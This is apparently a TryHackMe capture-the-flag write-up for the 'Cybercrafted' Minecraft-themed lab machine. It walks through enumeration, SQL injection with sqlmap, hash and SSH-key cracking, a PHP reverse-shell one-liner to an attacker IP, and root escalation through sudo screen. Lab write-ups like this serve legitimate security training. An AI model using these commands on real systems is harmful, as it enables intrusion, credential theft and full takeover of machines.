---
title: Cybercrafted 🌲
tags:
  - Web
  - Enumeration
  - Minecraft
  - Linux
  - SQLi
  - Brute-Forcing
  - TryHackMe
---
![](Pasted%20image%2020240527120906.png)

> This room is about cracking a Minecraft server
> *So lovely :D*
## Reconnaissance

First, I added the ip to my `/etc/hosts` file:

```shell
sudo echo "10.10.232.248 cybercrafted.thm" | sudo tee -a /etc/hosts
```

Then I performed an `Nmap` scan:

```shell
nmap -sC -T4 -p- 10.10.232.248 > sC.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 12:01 UTC
Nmap scan report for cybercrafted.thm (10.10.232.248)
Host is up (0.056s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
80/tcp    open  http
|_http-title: Cybercrafted
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 19.71 seconds
```

Then I went to take a look to the webpage and its code:

![](Pasted%20image%2020240527121328.png)

I found something interesting inside the web code:

```html
<!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->
```

So it's time to subdomain enumeration!
- More info in [Subdomain enumeration 🌞](/notes/subdomain_enumeration)

```shell
wfuzz -c -z file,'/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt' -u "http://cybercrafted.thm" -H "Host:FUZZ.cybercrafted.thm" --hw 65 > wfuzz_results.txt

# Results
000000001:   200        34 L     71 W       832 Ch      "www" 
000000024:   200        30 L     64 W       937 Ch      "admin"
000000081:   403        9 L      28 W       287 Ch      "store"
000000290:   200        30 L     64 W       937 Ch      "www.admin"
000000689:   400        10 L     35 W       301 Ch      "gc._msdcs"
```

So I searched for the `admin` subdomain (remember to add it to the `/etc/hosts`):

![](Pasted%20image%2020240527122518.png)

I tried some common combinations but none worked, so it's time for more enumeration!:
- More info in [dirsearch 📁](/notes/tools/dirsearch.md)

```shell
dirsearch -u http://admin.cybercrafted.thm

# Found this subdirectory
http://admin.cybercrafted.thm/assets/
```

![](Pasted%20image%2020240527123038.png)

So I performed a more detailed scan again:

```shell
dirsearch -e php,html,js -u http://admin.cybercrafted.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.tx
# Found nothing

# Tried the next one
dirsearch -e php,html,js -u http://admin.cybercrafted.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt
```

As nothing was found I tried the other subdomain `store`, which had a `403` error:

```shell
dirsearch -e php,html,js -u http://store.cybercrafted.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt
# Found nothing

# Tried this one:
dirsearch -e php,html,js -u http://store.cybercrafted.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
```

As I wasn't finding nothing, I tried to use `gobuster`
- More info in [Gobuster 🐦](/notes/tools/Gobuster.md)

```shell
gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt --no-error -t 100 -x php

# Found
/search.php           (Status: 200) [Size: 838]
```

![](Pasted%20image%2020240527132134.png)

It seems like a web to find items, so I'll try some SQLi

![](Pasted%20image%2020240527132228.png)

Capturing the request with `Burp` I produced a 500 error:

![](Pasted%20image%2020240527133011.png)

So it's time to use Sqlmap with that request:
- More info in [Sqlmap 🪲](/notes/tools/Sqlmap.md)

```shell
sqlmap -r req.txt -p 'search' --level=3 --risk=3 --batch --dbs --dump --threads 3 
```

> *Bingo!*

![](Pasted%20image%2020240527133530.png)

We also found the hash of the user, so we can go to [hashes.com](https://hashes.com/en/decrypt/hash) and decrypt it:

![](Pasted%20image%2020240527133757.png)

Now we can login to the previously discovered `admin` suibdomain:

![](Pasted%20image%2020240527133915.png)

Now I could obtain a reverse shell with:
- More info in [Reverse shells 👾](reverse_shells.md)

```shell
php -r '$sock=fsockopen("10.11.74.136",666);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Now I found and encrypted id_rsa on the `.ssh` directory:

![](Pasted%20image%2020240527135446.png)

So I'll copy it to my machine and bruteforce it:

```shell
python3 -m http.server:8090 #on the victim's machine

wget http://cybercrafted.thm:8090/id_rsa # on my machine
```

Now I'll crack it with `John`:
- More info in [SSH 🔓](/notes/ssh.md)

```shell
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

creepin2006      (id_rsa)  
```

So now we've got the ssh password for the user `xxultimatecreeperxx`.

To get the minecraft server flag we can do:

```shell
find / -name "minecraft_server_flag.txt" 2>/dev/null
```

![](Pasted%20image%2020240527140608.png)

Now we run the command `id` to check our groups and privileges:

```shell
id
uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
```

Now we can to what we've got access with group `minecraft`:

```shell
/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted/help.yml
/opt/minecraft/cybercrafted/commands.yml
/opt/minecraft/cybercrafted/world/level.dat_mcr
/opt/minecraft/cybercrafted/world/session.lock
/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/playerdata/77f6b2f8-e83c-458d-9795-6487671ad59f.dat
/opt/minecraft/cybercrafted/world/DIM1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/data/villages_nether.dat
/opt/minecraft/cybercrafted/world/data/villages.dat
/opt/minecraft/cybercrafted/world/data/villages_end.dat
/opt/minecraft/cybercrafted/world/data/Fortress.dat
/opt/minecraft/cybercrafted/world/forcedchunks.dat
/opt/minecraft/cybercrafted/world/uid.dat
/opt/minecraft/cybercrafted/world/stats/_madrins.json
/opt/minecraft/cybercrafted/world/stats/hank20000.json
/opt/minecraft/cybercrafted/world/stats/77f6b2f8-e83c-458d-9795-6487671ad59f.json
/opt/minecraft/cybercrafted/world/players/hank20000.dat
/opt/minecraft/cybercrafted/world/players/_madrins.dat
/opt/minecraft/cybercrafted/world/region/r.-2.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-1.mca
/opt/minecraft/cybercrafted/world/region/r.0.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.0.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-2.mca
/opt/minecraft/cybercrafted/world/region/r.0.-1.mca
/opt/minecraft/cybercrafted/permissions.yml
/opt/minecraft/cybercrafted/server-icon.png
/opt/minecraft/cybercrafted/world_the_end/session.lock
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_the_end/uid.dat
/opt/minecraft/cybercrafted/white-list.txt
/opt/minecraft/cybercrafted/craftbukkit-1.7.2-server.jar
/opt/minecraft/cybercrafted/world_nether/session.lock
/opt/minecraft/cybercrafted/world_nether/level.dat_old
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_nether/level.dat
/opt/minecraft/cybercrafted/world_nether/uid.dat
/opt/minecraft/cybercrafted/plugins/LoginSystem_v.2.4.jar
/opt/minecraft/cybercrafted/plugins/LoginSystem/settings.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
/opt/minecraft/cybercrafted/plugins/LoginSystem/language.yml
/opt/minecraft/cybercrafted/logs/2021-06-28-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-5.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-4.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-28-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-1.log.gz
/opt/minecraft/cybercrafted/server.properties
/opt/minecraft/cybercrafted/ops.txt
/opt/minecraft/cybercrafted/bukkit.yml
/opt/minecraft/cybercrafted/banned-ips.txt
/opt/minecraft/cybercrafted/banned-players.txt
```

We found the other user's password!:

![](Pasted%20image%2020240527141101.png)

Now we can get the user flag:

![](Pasted%20image%2020240527141257.png)

Now we run `sudo -l` to see capabilities:

![](Pasted%20image%2020240527141529.png)

Now I run this:

```shell
sudo -u root /usr/bin/screen -r cybercrafted
# The press Ctrl + A + C
```

We've got the root flag :D

![](Pasted%20image%2020240527141838.png)

==Machine pwned==